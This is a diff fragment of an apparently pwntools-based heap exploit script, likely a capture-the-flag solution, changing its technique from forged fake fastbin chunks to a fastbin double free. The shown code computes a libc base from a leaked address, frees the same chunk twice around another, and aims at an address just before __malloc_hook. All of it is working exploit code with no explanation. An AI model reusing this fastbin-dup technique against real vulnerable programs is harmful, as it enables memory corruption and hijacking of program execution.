@@ -37,25 +37,17 @@ log.info('leak : ' + hex(leak))
 libc.address = leak - 0x3c4b00
 log.info('libc_base : ' + hex(libc.address))
 
-# make fake fastbins
-payload  = p64(0)
-payload += p64(0x71) # + 0x10
-payload += p64(0) * 12
-payload += p64(0)
-payload += p64(0x71) # 0x70
-payload += p64(0) * 12
-payload += p64(0)
-payload += p64(0x71)
+# fastbin dup
+a = add(0x60, p64(0))['addr']
+b = add(0x60, p64(0))['addr']
 
-addr = add(0x300, payload)['addr']
+log.info('delete : ' + hex(a))
+log.info('delete : ' + hex(b))
+log.info('delete : ' + hex(a))
 
-log.info('delete : ' + hex(addr + 0x10))
-log.info('delete : ' + hex(addr + 0x80))
-log.info('delete : ' + hex(addr + 0x10))
-
-delete(addr + 0x10)
-delete(addr + 0x80)
-delete(addr + 0x10)
+delete(a)
+delete(b)
+delete(a)
 
 target = libc.symbols['__malloc_hook'] - 0x23
 
